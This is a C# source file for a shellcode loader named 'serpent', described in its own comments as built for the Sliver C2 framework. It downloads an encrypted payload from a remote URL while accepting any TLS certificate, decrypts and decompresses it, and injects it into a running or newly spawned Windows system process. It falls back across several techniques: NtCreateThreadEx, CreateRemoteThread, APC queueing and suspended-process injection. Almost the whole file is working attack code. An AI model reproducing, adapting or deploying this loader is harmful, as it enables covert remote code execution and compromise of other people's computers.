using System;
using System.Linq;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Diagnostics;

namespace serpent
{
    /// <summary>
    /// Advanced process injection loader for Sliver C2 shellcode
    /// Features: AES decryption, GZIP/Deflate decompression, NT-API injection with fallbacks
    /// </summary>
    public class Loader
    {
        #region Win32 API Structures & Enums

        /// <summary>
        /// Security attributes for process/thread creation
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }

        /// <summary>
        /// Process information returned by CreateProcess
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }

        /// <summary>
        /// Process creation flags for CreateProcess
        /// </summary>
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }

        /// <summary>
        /// Startup information for CreateProcess
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;

            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }

        #endregion

        #region NT API Structures

        /// <summary>
        /// Unicode string structure used by NT APIs
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        /// <summary>
        /// Object attributes for NT APIs
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        /// <summary>
        /// Client ID structure for process/thread identification
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;  // Process ID
            public IntPtr UniqueThread;   // Thread ID
        }

        #endregion

        #region Win32 API Imports

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateProcessA(
            String lpApplicationName,
            String lpCommandLine,
            SecurityAttributes lpProcessAttributes,
            SecurityAttributes lpThreadAttributes,
            Boolean bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwProcessId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwThreadId
        );

        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        #endregion

        #region NT API Imports

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtOpenProcess(
            out IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            IntPtr NumberOfBytesToWrite,
            out IntPtr NumberOfBytesWritten
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr NumberOfBytesToProtect,
            uint NewProtect,
            out uint OldProtect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartAddress,
            IntPtr Parameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr AttributeList
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcRoutineContext,
            IntPtr ApcStatusBlock,
            IntPtr ApcReserved
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtResumeThread(
            IntPtr ThreadHandle,
            out uint SuspendCount
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtClose(
            IntPtr Handle
        );

        #endregion

        #region Constants

        // NTSTATUS success code
        private const uint STATUS_SUCCESS = 0x00000000;

        // Memory allocation flags
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;

        // Memory protection flags
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        // Process access flags
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

        // Thread access flags
        private const uint THREAD_SET_CONTEXT = 0x0010;
        private const uint THREAD_SUSPEND_RESUME = 0x0002;

        #endregion

        #region Core Loading Logic

        /// <summary>
        /// Main loading method: downloads, decrypts, decompresses, and injects shellcode
        /// </summary>
        public static void DownloadAndExecute(
            string url,
            string targetBinary,
            string compressionAlgorithm,
            byte[] aesKey,
            byte[] aesIV)
        {
            try
            {
                // Configure SSL/TLS to accept self-signed certificates
                ServicePointManager.ServerCertificateValidationCallback +=
                    (sender, certificate, chain, sslPolicyErrors) => true;
                ServicePointManager.SecurityProtocol =
                    SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

                // Download encrypted payload
                WebClient client = new WebClientWithTimeout();
                byte[] encrypted = client.DownloadData(url);

                // Extract IV (first 16 bytes) and encrypted data (remaining)
                byte[] iv = new byte[16];
                byte[] actual = new byte[encrypted.Length - 16];
                Array.Copy(encrypted, 0, iv, 0, 16);
                Array.Copy(encrypted, 16, actual, 0, encrypted.Length - 16);

                // Decrypt if key provided
                byte[] compressed = (aesKey != null && aesIV != null)
                    ? Decrypt(actual, aesKey, iv)
                    : encrypted;

                // Decompress if compression specified
                byte[] shellcode = Decompress(compressed, compressionAlgorithm);

                Console.WriteLine($"[*] Shellcode size: {shellcode.Length} bytes");

                // Find or spawn target process and inject
                IntPtr hProcess = InjectIntoProcess(targetBinary, shellcode);

                if (hProcess == IntPtr.Zero)
                    throw new Exception("Injection failed - no process handle returned");

                // Cleanup
                NtClose(hProcess);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
                throw;
            }
        }

        #endregion

        #region Process Management

        /// <summary>
        /// Finds or spawns the target process and injects shellcode
        /// </summary>
        private static IntPtr InjectIntoProcess(string targetBinary, byte[] shellcode)
        {
            string processName = targetBinary.Replace(".exe", "");
            Process[] processes = Process.GetProcessesByName(processName);

            if (processes.Length > 0)
            {
                Console.WriteLine($"[*] Found process: {processName} (PID: {processes[0].Id})");
                return InjectIntoExistingProcess(processes[0], shellcode);
            }
            else
            {
                Console.WriteLine($"[*] Process {processName} not found, spawning...");
                return SpawnAndInject(shellcode, targetBinary);
            }
        }

        #endregion

        #region Process Injection Methods

        /// <summary>
        /// Injects shellcode into an existing process using multiple methods with fallbacks
        /// </summary>
        private static IntPtr InjectIntoExistingProcess(Process targetProcess, byte[] shellcode)
        {
            IntPtr hProcess = IntPtr.Zero;

            try
            {
                Console.WriteLine($"[*] Targeting: {targetProcess.ProcessName} (PID: {targetProcess.Id})");

                // 1. Open the process using NT API first, fallback to Win32
                hProcess = OpenTargetProcess(targetProcess.Id);
                if (hProcess == IntPtr.Zero)
                    throw new Exception("Failed to open process");

                // 2. Allocate memory in the target process
                IntPtr baseAddress = AllocateMemoryInProcess(hProcess, shellcode.Length);
                if (baseAddress == IntPtr.Zero)
                    throw new Exception("Failed to allocate memory");

                // 3. Write shellcode to allocated memory
                if (!WriteShellcodeToProcess(hProcess, baseAddress, shellcode))
                    throw new Exception("Failed to write shellcode");

                // 4. Change memory protection to RX (execute-read)
                if (!ProtectMemoryInProcess(hProcess, baseAddress, shellcode.Length))
                    Console.WriteLine("[!] Warning: Could not change memory protection");

                // 5. Create execution thread using multiple methods
                if (!ExecuteShellcodeInProcess(hProcess, baseAddress, targetProcess))
                    throw new Exception("All thread creation methods failed");

                Console.WriteLine("[+] Injection complete!");
                return hProcess;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Injection error: {ex.Message}");
                if (hProcess != IntPtr.Zero)
                    NtClose(hProcess);
                throw;
            }
        }

        /// <summary>
        /// Opens the target process using NT API with Win32 fallback
        /// </summary>
        private static IntPtr OpenTargetProcess(int processId)
        {
            // Try NT API first
            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)processId,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };

            IntPtr hProcess;
            uint result = NtOpenProcess(
                out hProcess,
                PROCESS_ALL_ACCESS,
                ref objAttr,
                ref clientId
            );

            if (result == STATUS_SUCCESS && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[+] Opened process with NtOpenProcess");
                return hProcess;
            }

            // Fallback to Win32 API
            Console.WriteLine($"[*] NtOpenProcess failed (0x{result:X8}), trying OpenProcess...");
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);

            if (hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[+] Opened process with OpenProcess");
                return hProcess;
            }

            Console.WriteLine("[-] Failed to open process with any method");
            return IntPtr.Zero;
        }

        /// <summary>
        /// Allocates memory in the target process using NT API with Win32 fallback
        /// </summary>
        private static IntPtr AllocateMemoryInProcess(IntPtr hProcess, int size)
        {
            // Try NT API first
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)size;

            uint result = NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (result == STATUS_SUCCESS && baseAddress != IntPtr.Zero)
            {
                Console.WriteLine($"[+] Allocated {size} bytes at 0x{baseAddress.ToInt64():X} with NtAllocateVirtualMemory");
                return baseAddress;
            }

            // Fallback to Win32 API
            Console.WriteLine($"[*] NtAllocateVirtualMemory failed (0x{result:X8}), trying VirtualAllocEx...");
            baseAddress = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (baseAddress != IntPtr.Zero)
            {
                Console.WriteLine($"[+] Allocated {size} bytes with VirtualAllocEx");
                return baseAddress;
            }

            Console.WriteLine("[-] Failed to allocate memory with any method");
            return IntPtr.Zero;
        }

        /// <summary>
        /// Writes shellcode to allocated memory using NT API with Win32 fallback
        /// </summary>
        private static bool WriteShellcodeToProcess(IntPtr hProcess, IntPtr baseAddress, byte[] shellcode)
        {
            // Try NT API first
            IntPtr bytesWritten = IntPtr.Zero;
            uint result = NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                shellcode,
                (IntPtr)shellcode.Length,
                out bytesWritten
            );

            if (result == STATUS_SUCCESS && bytesWritten.ToInt64() == shellcode.Length)
            {
                Console.WriteLine($"[+] Wrote {bytesWritten.ToInt64()} bytes with NtWriteVirtualMemory");
                return true;
            }

            // Fallback to Win32 API
            Console.WriteLine($"[*] NtWriteVirtualMemory failed (0x{result:X8}), trying WriteProcessMemory...");
            int written = 0;
            if (WriteProcessMemory(hProcess, baseAddress, shellcode, shellcode.Length, out written))
            {
                Console.WriteLine($"[+] Wrote {written} bytes with WriteProcessMemory");
                return true;
            }

            Console.WriteLine("[-] Failed to write memory with any method");
            return false;
        }

        /// <summary>
        /// Changes memory protection to PAGE_EXECUTE_READ using NT API with Win32 fallback
        /// </summary>
        private static bool ProtectMemoryInProcess(IntPtr hProcess, IntPtr baseAddress, int size)
        {
            uint oldProtect = 0;
            IntPtr protectSize = (IntPtr)size;

            uint result = NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref protectSize,
                PAGE_EXECUTE_READ,
                out oldProtect
            );

            if (result == STATUS_SUCCESS)
            {
                Console.WriteLine("[+] Memory protection changed to PAGE_EXECUTE_READ with NtProtectVirtualMemory");
                return true;
            }

            // Fallback to Win32 API
            Console.WriteLine($"[*] NtProtectVirtualMemory failed (0x{result:X8}), trying VirtualProtectEx...");
            if (VirtualProtectEx(hProcess, baseAddress, (uint)size, PAGE_EXECUTE_READ, out oldProtect))
            {
                Console.WriteLine("[+] Memory protection changed with VirtualProtectEx");
                return true;
            }

            Console.WriteLine("[-] Failed to change memory protection with any method");
            return false;
        }

        /// <summary>
        /// Executes shellcode using multiple methods with fallbacks
        /// </summary>
        private static bool ExecuteShellcodeInProcess(IntPtr hProcess, IntPtr baseAddress, Process targetProcess)
        {
            // Method 1: NtCreateThreadEx
            IntPtr hThread;
            uint result = NtCreateThreadEx(
                out hThread,
                0x1FFFFF,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            );

            if (result == STATUS_SUCCESS && hThread != IntPtr.Zero)
            {
                Console.WriteLine("[+] Success with NtCreateThreadEx");
                NtClose(hThread);
                return true;
            }

            // Method 2: CreateRemoteThread
            Console.WriteLine($"[*] NtCreateThreadEx failed (0x{result:X8})");
            IntPtr hRemoteThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                IntPtr.Zero
            );

            if (hRemoteThread != IntPtr.Zero)
            {
                Console.WriteLine("[+] Success with CreateRemoteThread");
                NtClose(hRemoteThread);
                return true;
            }

            // Method 3: APC Queue
            Console.WriteLine("[*] Thread creation methods failed, trying APC Queue...");
            bool apcSuccess = false;
            foreach (ProcessThread thread in targetProcess.Threads)
            {
                try
                {
                    IntPtr hThread2 = OpenThread(
                        THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                        false,
                        (uint)thread.Id
                    );

                    if (hThread2 != IntPtr.Zero)
                    {
                        SuspendThread(hThread2);
                        result = NtQueueApcThread(
                            hThread2,
                            baseAddress,
                            IntPtr.Zero,
                            IntPtr.Zero,
                            IntPtr.Zero
                        );
                        ResumeThread(hThread2);
                        NtClose(hThread2);

                        if (result == STATUS_SUCCESS)
                        {
                            Console.WriteLine($"[+] APC queued to thread {thread.Id}");
                            apcSuccess = true;
                            break;
                        }
                    }
                }
                catch { /* Continue to next thread */ }
            }

            if (apcSuccess)
                return true;

            Console.WriteLine("[-] All methods failed");
            return false;
        }

        /// <summary>
        /// Spawns a new process in suspended state and injects shellcode
        /// </summary>
        private static IntPtr SpawnAndInject(byte[] shellcode, string binaryPath)
        {
            StartupInfo sInfo = new StartupInfo();
            ProcessInformation pInfo;

            // Construct full system path (C:\Windows\System32\binary)
            string fullPath = string.Concat("C:\\Windows\\System32\\", binaryPath);

            IntPtr funcAddr = CreateProcessA(
                fullPath,
                null,
                null,
                null,
                true,
                CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NO_WINDOW,
                IntPtr.Zero,
                null,
                sInfo,
                out pInfo
            );

            if (funcAddr == IntPtr.Zero)
            {
                throw new Exception("Failed to create process");
            }

            IntPtr hProcess = pInfo.hProcess;
            IntPtr hThread = pInfo.hThread;

            try
            {
                // Allocate memory
                IntPtr baseAddress = AllocateMemoryInProcess(hProcess, shellcode.Length);
                if (baseAddress == IntPtr.Zero)
                    throw new Exception("Failed to allocate memory");

                // Write shellcode
                if (!WriteShellcodeToProcess(hProcess, baseAddress, shellcode))
                    throw new Exception("Failed to write shellcode");

                // Change protection to RX
                if (!ProtectMemoryInProcess(hProcess, baseAddress, shellcode.Length))
                    Console.WriteLine("[!] Warning: Could not change memory protection");

                // Resume the suspended thread to execute shellcode
                uint suspendCount;
                NtResumeThread(hThread, out suspendCount);
                Console.WriteLine($"[+] Resumed thread with suspend count: {suspendCount}");

                return hProcess;
            }
            catch
            {
                // Cleanup on error
                if (hProcess != IntPtr.Zero) NtClose(hProcess);
                if (hThread != IntPtr.Zero) NtClose(hThread);
                throw;
            }
        }

        #endregion

        #region Decryption & Decompression

        /// <summary>
        /// Decrypts AES-encrypted data using the provided key and IV
        /// </summary>
        public static byte[] Decrypt(byte[] ciphertext, byte[] aesKey, byte[] aesIV)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = aesKey;
                aesAlg.IV = aesIV;
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.Mode = CipherMode.CBC;

                using (var decryptor = aesAlg.CreateDecryptor())
                using (var ms = new MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var output = new MemoryStream())
                {
                    cs.CopyTo(output);
                    return output.ToArray();
                }
            }
        }

        /// <summary>
        /// Decompresses data using Deflate or GZip based on the specified algorithm
        /// </summary>
        public static byte[] Decompress(byte[] data, string algorithm)
        {
            if (string.Equals(algorithm, "deflate9", StringComparison.OrdinalIgnoreCase))
            {
                return DecompressWithDeflate(data);
            }
            else if (string.Equals(algorithm, "gzip", StringComparison.OrdinalIgnoreCase))
            {
                return DecompressWithGZip(data);
            }

            // No compression
            return data;
        }

        private static byte[] DecompressWithDeflate(byte[] data)
        {
            using (var compressStream = new MemoryStream(data))
            using (var deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
            using (var decompressedStream = new MemoryStream())
            {
                deflateStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }

        private static byte[] DecompressWithGZip(byte[] data)
        {
            using (var compressStream = new MemoryStream(data))
            using (var gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
            using (var decompressedStream = new MemoryStream())
            {
                gzipStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }

        #endregion

        #region Utilities

        /// <summary>
        /// WebClient with extended timeout
        /// </summary>
        public class WebClientWithTimeout : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 50000000; // 50 seconds
                return wr;
            }
        }

        #endregion
    }
}